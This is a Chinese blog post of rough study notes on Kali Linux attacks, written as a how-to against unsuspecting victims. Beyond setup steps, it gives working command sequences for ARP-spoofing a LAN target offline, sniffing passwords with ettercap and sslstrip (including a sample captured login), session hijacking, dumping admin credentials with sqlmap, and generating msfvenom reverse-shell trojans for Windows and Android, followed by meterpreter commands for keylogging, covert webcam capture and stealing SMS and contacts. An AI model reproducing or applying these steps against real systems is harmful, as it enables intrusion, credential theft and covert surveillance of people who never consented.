<!DOCTYPE html>
<html lang="zh-Hans">
  <head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">

<meta name="theme-color" content="#f8f5ec">
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="Jack of all trades and master of none."><link rel="alternate" href="/atom.xml" title="Aaron Li"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.10.2">
<link rel="canonical" href="muzimz.cn/page/2/">

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css">
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.10.2">

<script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true};
</script>

    <title>Aaron Li</title>
  </head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">Aaron Li</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/">
        <li class="mobile-menu-item">首页
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">Aaron Li</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/">
            首页
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><section id="posts" class="posts"><article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2018/09/28/Kali/">Kali基本操作</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-28
        </span><span class="post-category">
            <a href="/categories/白帽子/">白帽子</a>
            </span>
        </div>
    </header>

    <div class="post-content"><blockquote>
<p>以下内容为博主学习《Kali Linux渗透测试的艺术》一书所记录的笔记，有点凌乱、还未整理，有时间再来弄。</p>
</blockquote>
<h2 id="一、换源并安装open-vm-tools"><a href="#一、换源并安装open-vm-tools" class="headerlink" title="一、换源并安装open-vm-tools"></a>一、换源并安装open-vm-tools</h2><h3 id="1-1-打开sources-list文件"><a href="#1-1-打开sources-list文件" class="headerlink" title="1.1 打开sources.list文件"></a>1.1 打开sources.list文件</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/apt/sources.<span class="built_in">list</span></span><br></pre></td></tr></table></figure>
<h3 id="1-2-在文件中添加如下内容"><a href="#1-2-在文件中添加如下内容" class="headerlink" title="1.2 在文件中添加如下内容"></a>1.2 在文件中添加如下内容</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deb <span class="string">http:</span><span class="comment">//mirrors.edu.cn/kali sana main non-free contrib</span></span><br><span class="line">deb <span class="string">http:</span><span class="comment">//mirrors.edu.cn/kali-security/sana/updates main contrib non-free</span></span><br><span class="line">deb-src <span class="string">http:</span><span class="comment">//mirrors.ustc.edu.cn/kali-security/sana/updates main contrib non-free</span></span><br><span class="line">deb <span class="string">http:</span><span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free</span></span><br></pre></td></tr></table></figure>
<h3 id="1-3-更新并安装"><a href="#1-3-更新并安装" class="headerlink" title="1.3 更新并安装"></a>1.3 更新并安装</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> <span class="keyword">update</span></span><br><span class="line">apt-<span class="built_in">get</span> install <span class="keyword">open</span>-<span class="keyword">vm</span>-tools-desktop fuse</span><br></pre></td></tr></table></figure>
<h2 id="二、安装中文输入"><a href="#二、安装中文输入" class="headerlink" title="二、安装中文输入"></a>二、安装中文输入</h2><h3 id="2-1-下载搜狗"><a href="#2-1-下载搜狗" class="headerlink" title="2.1 下载搜狗"></a>2.1 下载搜狗</h3><p>在pinyin.sogou.com/linux中下载搜狗</p>
<h3 id="2-2-安装"><a href="#2-2-安装" class="headerlink" title="2.2 安装"></a>2.2 安装</h3><p>终端进入上方文件路径，执行如下：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解决依赖：apt-<span class="builtin-name">get</span> install -f</span><br><span class="line">安装：dpkg -i 包名</span><br></pre></td></tr></table></figure></p>
<h2 id="三、美化kali"><a href="#三、美化kali" class="headerlink" title="三、美化kali"></a>三、美化kali</h2><p>图标位置：/usr/share/icons/<br>主题位置：/usr/share/themes/</p>
<h3 id="四、局域网断网攻击"><a href="#四、局域网断网攻击" class="headerlink" title="四、局域网断网攻击"></a>四、局域网断网攻击</h3><h3 id="4-1-欺骗"><a href="#4-1-欺骗" class="headerlink" title="4.1 欺骗"></a>4.1 欺骗</h3><p>欺骗命令如下：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -<span class="selector-tag">i</span> 网卡 -t 被骗目标ip 网关</span><br></pre></td></tr></table></figure></p>
<p>欺骗命令执行之前需要桥接自己的kali网络，其桥接过程如下：</p>
<ol>
<li>右键kali系统，点开设置</li>
<li>将网络适配器设置成桥接模式</li>
<li>一次点开：编辑 -&gt; 虚拟网络编辑器 -&gt; vmnet0 -&gt; 确定</li>
</ol>
<p>参数解读：</p>
<ol>
<li>网卡：网卡是kali的网卡名，可以使用ifconfig查看（可见eth0）</li>
<li>被骗目标ip：受害者的ip，windows用户可以使用ipconfig查看</li>
<li>网关：网关是一个中间载体，同样可以使用ipconfig查看（默认网关）</li>
</ol>
<p>ip查询：我们在对受害者进行arp欺骗的时候，往往是不知道对方的ip的，但是我么可以使用如下命令偷偷的查询对方ip：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -asg <span class="number">192.168</span><span class="number">.31</span><span class="number">.0</span>/<span class="number">24</span> <span class="comment">//网关最后是0+24</span></span><br></pre></td></tr></table></figure></p>
<h3 id="4-2-攻击"><a href="#4-2-攻击" class="headerlink" title="4.2 攻击"></a>4.2 攻击</h3><h4 id="4-2-1-瘫痪对方的电脑"><a href="#4-2-1-瘫痪对方的电脑" class="headerlink" title="4.2.1 瘫痪对方的电脑"></a>4.2.1 瘫痪对方的电脑</h4><p>执行上述命令，即可让对方的网络瘫痪：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -<span class="selector-tag">i</span> 网卡 -t 被骗目标ip 网关</span><br></pre></td></tr></table></figure>
<p>执行之后，对方就无法正常使用网络了（比如访问网页、qq聊天等等一切网络活动），ctrl+z之后取消瘫痪操作</p>
<h4 id="4-2-2-劫持对方的请求（账号，密码之类的）"><a href="#4-2-2-劫持对方的请求（账号，密码之类的）" class="headerlink" title="4.2.2 劫持对方的请求（账号，密码之类的）"></a>4.2.2 劫持对方的请求（账号，密码之类的）</h4><p>这里的劫持与上后面的瘫痪有点不同，劫持的话不能让对方网络瘫痪，所以我们在劫持之前需要进行如下命令操作（ip流量转发）：<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /proc/sys/net/ipv4/  # 进入该目录</span><br><span class="line">cat ip_forward  # 查看属性值，会发现输出<span class="number">0</span>（默认是<span class="number">0</span>，我们需要更改为<span class="number">1</span>）</span><br><span class="line">echo <span class="number">1</span> &gt; ip_forward```# 将ip_forward值改为<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>如上操作之后我们继续执行arpspoof欺骗：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -<span class="selector-tag">i</span> 网卡 -t 被骗目标ip 网关</span><br></pre></td></tr></table></figure></p>
<p>在欺骗之后，我们执行如下命令来进行嗅探：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -<span class="selector-tag">i</span> eth0</span><br></pre></td></tr></table></figure></p>
<p>执行之后发现，虽然这次对方可以正常使用网络，但是他的电脑已经在我们的监控中了，比如目标登录自己的某个站点，则在kali的终端上会输出对方的账号及密码</p>
<h4 id="4-2-4-嗅探对方的浏览图片"><a href="#4-2-4-嗅探对方的浏览图片" class="headerlink" title="4.2.4 嗅探对方的浏览图片"></a>4.2.4 嗅探对方的浏览图片</h4><p>在进行上述的ip流量转发之后，我们可以使用如下命令来截取对方浏览页面的图片：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -<span class="selector-tag">i</span> eth0</span><br></pre></td></tr></table></figure></p>
<p>执行之后，会出现一个窗口    ，该窗口用于显示对方浏览页面的图片，并会将图片保存至kali本地</p>
<h2 id="五、https账号、密码获取"><a href="#五、https账号、密码获取" class="headerlink" title="五、https账号、密码获取"></a>五、https账号、密码获取</h2><h3 id="5-1-准备工作"><a href="#5-1-准备工作" class="headerlink" title="5.1 准备工作"></a>5.1 准备工作</h3><h4 id="5-1-1-Vim：文本编辑器"><a href="#5-1-1-Vim：文本编辑器" class="headerlink" title="5.1.1 Vim：文本编辑器"></a>5.1.1 Vim：文本编辑器</h4><p>进入文件进行编辑：vim 123.txt （不存在会自动创建）<br>退出文件编辑：</p>
<ol>
<li>按ESC </li>
<li>shift+： </li>
<li><ol>
<li>输入q！   # 不保存退出</li>
</ol>
</li>
</ol>
<p>打开 etterc.conf文件<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>ettercap<span class="regexp">/ettc.conf/</span></span><br></pre></td></tr></table></figure></p>
<p>移动光标，把linux设置一下，将redir前的注释符删掉<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">if</span> you use iptables:</span><br><span class="line">   #redir_command_on = <span class="string">"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"</span></span><br><span class="line">   #redir_command_off = <span class="string">"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"</span></span><br></pre></td></tr></table></figure></p>
<p>刚开始是不能编辑的，编辑操作如下</p>
<ul>
<li><p>vim编辑：按一下 i 就可以对文件进行编辑了，在上述所述的位置将两个#去掉</p>
</li>
<li><p>vim保存：按一下ESC键，再按shift+:键，继续如下：</p>
</li>
</ul>
<ol>
<li>wq   保存并退出</li>
<li>q!   不保存并退出</li>
</ol>
<h4 id="5-1-2-开启ssh："><a href="#5-1-2-开启ssh：" class="headerlink" title="5.1.2 开启ssh："></a>5.1.2 开启ssh：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/etc/i</span>nitd<span class="regexp">/ssh start</span></span><br></pre></td></tr></table></figure>
<h4 id="5-1-3-sslstrip工具"><a href="#5-1-3-sslstrip工具" class="headerlink" title="5.1.3 sslstrip工具"></a>5.1.3 sslstrip工具</h4><p>这个工具能够把https的链接还原为http。<br>执行命令：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -<span class="selector-tag">a</span> -f -k</span><br></pre></td></tr></table></figure></p>
<p>参数说明：</p>
<ol>
<li>-a</li>
<li>-f</li>
<li>-k</li>
</ol>
<h3 id="5-2-截取账号及密码"><a href="#5-2-截取账号及密码" class="headerlink" title="5.2 截取账号及密码"></a>5.2 截取账号及密码</h3><ul>
<li><p>执行欺骗操作</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">arpspoof</span> <span class="selector-tag">-i</span> <span class="selector-tag">eth0</span> <span class="selector-tag">-t</span> 192<span class="selector-class">.168</span><span class="selector-class">.31</span><span class="selector-class">.117</span> 192<span class="selector-class">.168</span><span class="selector-class">.31</span><span class="selector-class">.1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>执行sslstrip</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -<span class="selector-tag">a</span> -f -k</span><br></pre></td></tr></table></figure>
</li>
<li><p>执行ettercap</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -<span class="selector-tag">i</span> eth0</span><br></pre></td></tr></table></figure>
</li>
<li><p>当目标用户登录https登录的时候就可以在kali终端获取到他的账号以及密码，例子如下：</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP : <span class="number">211.80</span><span class="number">.112</span><span class="number">.41</span>:<span class="number">80</span> -&gt; </span><br><span class="line"><span class="symbol">USER:</span> <span class="number">1620814</span>  </span><br><span class="line"><span class="symbol">PASS:</span> <span class="number">741948</span>a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a  </span><br><span class="line"><span class="symbol">INFO:</span> mids.gench.edu.cn/_customize/passLogin</span><br><span class="line"><span class="symbol">CONTENT:</span> loginTicket=<span class="number">425</span>d9c18<span class="number">-424</span>b<span class="number">-418</span>d-b027<span class="number">-2095e618</span>f829<span class="variable">&amp;username</span>=<span class="number">1620814</span><span class="variable">&amp;password</span>=<span class="number">741948</span>a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>分析：</p>
<ol>
<li>HTTP：ip及端口</li>
<li>USER：用户名</li>
<li>PASS：登录密码，注意：这里的密码并不是明文的，他是经过加密的，至于如何解密这个密码，以后有时间再来介绍</li>
<li>CONTENT：参数的组合</li>
</ol>
<h2 id="六、回话劫持，登录目标站点"><a href="#六、回话劫持，登录目标站点" class="headerlink" title="六、回话劫持，登录目标站点"></a>六、回话劫持，登录目标站点</h2><h3 id="6-1-工具准备"><a href="#6-1-工具准备" class="headerlink" title="6.1 工具准备"></a>6.1 工具准备</h3><ol>
<li>arpspoof     欺骗</li>
<li>wireshark        抓包</li>
<li>ferret       重新生成抓包后的文件</li>
<li>hamster</li>
</ol>
<p>ferret安装，一次执行如下：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-<span class="builtin-name">get</span> update &amp;&amp; apt-<span class="builtin-name">get</span> install ferret-sidejack:i386</span><br><span class="line">apt-<span class="builtin-name">get</span> clean &amp;&amp; apt-<span class="builtin-name">get</span> update &amp;&amp; apt-<span class="builtin-name">get</span><span class="built_in"> upgrade </span>-y &amp;&amp; apt-<span class="builtin-name">get</span> dist-upgrade -y</span><br><span class="line">apt install ferret -y</span><br></pre></td></tr></table></figure></p>
<h3 id="6-2-过程（方法一）"><a href="#6-2-过程（方法一）" class="headerlink" title="6.2 过程（方法一）"></a>6.2 过程（方法一）</h3><ul>
<li>arpspoof欺骗</li>
<li><p>启动wireshark</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wireshark</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>点击eth0网卡，并让他持续运行下去</p>
</li>
<li>目标登录某个站点（上钩）</li>
<li>为了防止延迟，让wireshark再运行一段时间之后停掉wireshark</li>
<li>保存文件名为cookie至桌面，并格式为wireshark…….pacp</li>
<li><p>终端进入桌面，并执行如下命令（这个ferret有点问题，在这记录一下，以后再来看）：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ferret</span> <span class="selector-tag">-r</span> <span class="selector-tag">cookie</span><span class="selector-class">.pcap</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>执行hamster，会看到要求我们把代理改成本地（127.0.0.1）的，然后端口为1234</p>
</li>
</ul>
<ol>
<li>代开kali内置的火狐浏览器</li>
<li>点击设置 -&gt; Advanced -&gt; Network -&gt; Settings -&gt; 勾选Manual……并将http proxy改为127.0.0.1：1234</li>
</ol>
<ul>
<li>在kali中访问127.0.0.1：1234</li>
<li>之后会发现有个欺骗的ip，点开后就会出现很多的链接，ctrl+f找到</li>
</ul>
<h3 id="6-3-过程（方法二）"><a href="#6-3-过程（方法二）" class="headerlink" title="6.3 过程（方法二）"></a>6.3 过程（方法二）</h3><ul>
<li>ferret -i eth0</li>
<li>以后在记录</li>
</ul>
<h2 id="七、SQLMAP注入，ASP、PHP网站渗透"><a href="#七、SQLMAP注入，ASP、PHP网站渗透" class="headerlink" title="七、SQLMAP注入，ASP、PHP网站渗透"></a>七、SQLMAP注入，ASP、PHP网站渗透</h2><h3 id="7-1-科普"><a href="#7-1-科普" class="headerlink" title="7.1 科普"></a>7.1 科普</h3><h4 id="7-1-1-ASP"><a href="#7-1-1-ASP" class="headerlink" title="7.1.1 ASP"></a>7.1.1 ASP</h4><p>ASP即Active Server Pages，是MicroSoft公司开发的服务器端脚本环境，可用来创建动态交互式网页并建立强大的web应用程序。当服务器收到对ASP文件的请求时，它会处理包含在用于构建发送给浏览器的HTML（Hyper Text Markup Language，超文本置标语言）网页文件中的服务器端脚本代码。除服务器端脚本代码外，ASP文件也可以包含文本、HTML（包括相关的客户端脚本）和com组件调用。 [1-2]<br>ASP简单、易于维护 ， 是小型页面应用程序的选择 ，在使用DCOM （Distributed Component Object Model）和 MTS（Microsoft Transaction Server）的情况下， ASP甚至可以实现中等规模的企业应用程序。 [3] </p>
<h4 id="7-1-2-PHP"><a href="#7-1-2-PHP" class="headerlink" title="7.1.2 PHP"></a>7.1.2 PHP</h4><p>PHP（外文名:PHP: Hypertext Preprocessor，中文名：“超文本预处理器”）是一种通用开源脚本语言。语法吸收了C语言、Java和Perl的特点，利于学习，使用广泛，主要适用于Web开发领域。PHP 独特的语法混合了C、Java、Perl以及PHP自创的语法。它可以比CGI或者Perl更快速地执行动态网页。用PHP做出的动态页面与其他的编程语言相比，PHP是将程序嵌入到HTML（标准通用标记语言下的一个应用）文档中去执行，执行效率比完全生成HTML标记的CGI要高许多；PHP还可以执行编译后代码，编译可以达到加密和优化代码运行，使代码运行更快。</p>
<h3 id="7-2-ASP渗透"><a href="#7-2-ASP渗透" class="headerlink" title="7.2 ASP渗透"></a>7.2 ASP渗透</h3><ul>
<li>监测是否存在注入<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -u 网站</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>如果该目标网站有注入，则会返回数据库的各种信息。</p>
<ul>
<li><p>拆解目标网站的数据库表</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 网站 <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>根据User表拆解列名</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlamp -u 网站 --<span class="built_in">columns</span> -<span class="built_in">T</span> <span class="string">"user"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>username拆解出来后就不需要再进行拆解了</p>
</li>
<li>得到目标网站后台管理员的登录密码<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sqlmap </span>-u 目标网站 <span class="built_in">--dump</span> -C <span class="string">"username,password"</span> -T <span class="string">"user"</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>—dump：下载数据<br>-C “username,password” 列名</p>
<h3 id="7-3-PHP渗透"><a href="#7-3-PHP渗透" class="headerlink" title="7.3 PHP渗透"></a>7.3 PHP渗透</h3><p>待更新</p>
<h3 id="7-4-Cookie渗透"><a href="#7-4-Cookie渗透" class="headerlink" title="7.4 Cookie渗透"></a>7.4 Cookie渗透</h3><p>待更新</p>
<h2 id="八、Metasplooit"><a href="#八、Metasplooit" class="headerlink" title="八、Metasplooit"></a>八、Metasplooit</h2><h3 id="8-1-基本操作"><a href="#8-1-基本操作" class="headerlink" title="8.1 基本操作"></a>8.1 基本操作</h3><ul>
<li>启动：msfconsole</li>
<li>漏洞利用工具：exploit</li>
<li>漏洞执行后的demo：payloads</li>
</ul>
<h3 id="8-2-远程控制软件"><a href="#8-2-远程控制软件" class="headerlink" title="8.2 远程控制软件"></a>8.2 远程控制软件</h3><h4 id="8-2-1-实现过程"><a href="#8-2-1-实现过程" class="headerlink" title="8.2.1 实现过程"></a>8.2.1 实现过程</h4><ul>
<li><p>根据自己的ip设定一个木马（旧版使用msfpayload 不是 msfvenom -p），本操作是在桌面路径下执行</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 <span class="attribute">LHOST</span>=kali的ip <span class="attribute">LPORT</span>=55555 -f exe &gt; test.exe</span><br></pre></td></tr></table></figure>
</li>
<li><p>之后会生成一个test.exe木马程序，将文件拖至windows平台上</p>
</li>
<li><p>使用handler模块，本操作以及之后的操作是在msfconsole下执行</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/multi/<span class="keyword">handler</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>用shellcode程序</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> PAYLOAD <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">show options</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>设置参数，比如设置ip和端口</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> LHOST 自己的<span class="comment">ip</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT</span> 端口（<span class="comment">55555</span>）</span><br></pre></td></tr></table></figure>
</li>
<li><p>执行并等待目标上钩</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">exploit</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="8-2-2-木马基本功能"><a href="#8-2-2-木马基本功能" class="headerlink" title="8.2.2 木马基本功能"></a>8.2.2 木马基本功能</h4><p>当用户点击您的鱼饵之后，您就拥有了对方的所有权限，一下是一些基本的操作：</p>
<ul>
<li>sysinfo：获取到对方设备的系统信息</li>
<li>shell获取受害者的终端权限，通过这个终端您就可以完全控制对方的设备</li>
<li>background：将该权限放到后台，通过session -l（小写字母I） 1来重新获取会话</li>
<li>run vnc：开启远程桌面，执行之后就可以看到对方完整的桌面了。</li>
<li>注入进程</li>
</ul>
<ol>
<li>得到要注入的pid进程：ls</li>
<li>migrate XXX（pid）注入</li>
</ol>
<h3 id="8-2-3-文件管理功能"><a href="#8-2-3-文件管理功能" class="headerlink" title="8.2.3 文件管理功能"></a>8.2.3 文件管理功能</h3><ul>
<li>download      下载文件</li>
<li>edit      编辑文件</li>
<li>cat       查看文件</li>
<li>mkdir     创建文件夹</li>
<li>mv        移动文件</li>
<li>rm        删除文件</li>
<li>upload        上传文件</li>
<li>rmdir     删除文件夹</li>
</ul>
<h3 id="8-2-4-网络及系统操作"><a href="#8-2-4-网络及系统操作" class="headerlink" title="8.2.4 网络及系统操作"></a>8.2.4 网络及系统操作</h3><p>网络操作：</p>
<ul>
<li>arp       看arp缓冲表</li>
<li>ifconfig      ip地址网卡</li>
<li>getproxy      获取代理</li>
<li>netstat       查看端口链接</li>
</ul>
<p>系统操作：</p>
<ul>
<li>kill      杀进程</li>
<li>ps        查看进程表</li>
<li>reboot    重启电脑</li>
<li>reg       修改注册表</li>
<li>shell     获取终端</li>
<li>shutdown  关闭电脑</li>
<li>sysinfo   获取系统信息</li>
</ul>
<h3 id="8-2-5-用户操作和其他功能"><a href="#8-2-5-用户操作和其他功能" class="headerlink" title="8.2.5 用户操作和其他功能"></a>8.2.5 用户操作和其他功能</h3><ul>
<li>enumdesktops      窗体</li>
<li>keyscan_dump      键盘记录—下载</li>
<li>keyscan_start     键盘记录—开始</li>
<li>keyscan_stop      键盘记录—停止</li>
<li>uictl             获取键盘鼠标控制权</li>
<li>record_mic        声音和音频录制</li>
<li>webscan_chat      查看摄像头接口</li>
<li>webscan_list      查看摄像头列表</li>
<li>webscan_stream          查看摄像头获取（偷窥）</li>
<li>getsystem     获取管理员权限</li>
<li>hashdump      下载hash</li>
<li></li>
</ul>
<h2 id="九、安卓渗透"><a href="#九、安卓渗透" class="headerlink" title="九、安卓渗透"></a>九、安卓渗透</h2><h3 id="9-1-实现过程"><a href="#9-1-实现过程" class="headerlink" title="9.1 实现过程"></a>9.1 实现过程</h3><ul>
<li>9.1 在终端根据自己的ip生成安卓木马<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 <span class="attribute">LHOST</span>=kali的ip <span class="attribute">LPORT</span>=55555 -f apk &gt; test.APK</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>生成木马之后，我们将木马程序装在手机上即可。在这里呢，也就是我们平时比较常见的未知链接、不明邮件之类的鬼东西。</p>
<ul>
<li><p>9.2 启动Metasplooit</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msfconsole</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>9.3 使用handler</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/multi/<span class="keyword">handler</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>9.4 设置安卓木马</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> PAYLOAD <span class="comment">android</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>9.5 查看参数</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">show options</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>9.6 设置参数</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> LHOST <span class="comment">192.168.31.147</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">HPORT 55555</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>9.7 启动监听</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">exploit</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="9-2-常见操作"><a href="#9-2-常见操作" class="headerlink" title="9.2 常见操作"></a>9.2 常见操作</h3><ul>
<li>search        搜索文件（.jpg、.png、.bmp之类的文件），这个操作就有点邪恶了，大家一定要注意哦！！！</li>
<li>download      下载（.jpg、.png、.bmp之类的文件，还有你的所有短信、所有电话联系人…………………）</li>
<li>webcam_stream        开启手机摄像头</li>
<li>webcam_snap       启动摄像头进行自动拍照（小心，这里拍照的过程中是不会有任何响应的，也就是说在这个过程中手机主人是不可能有任何察觉的）</li>
<li>check_root    检查ROOT</li>
<li>dump_calllog  下载电话记录</li>
<li>dump_contracts    下载短信记录</li>
<li>geolocat  gps定位</li>
</ul>
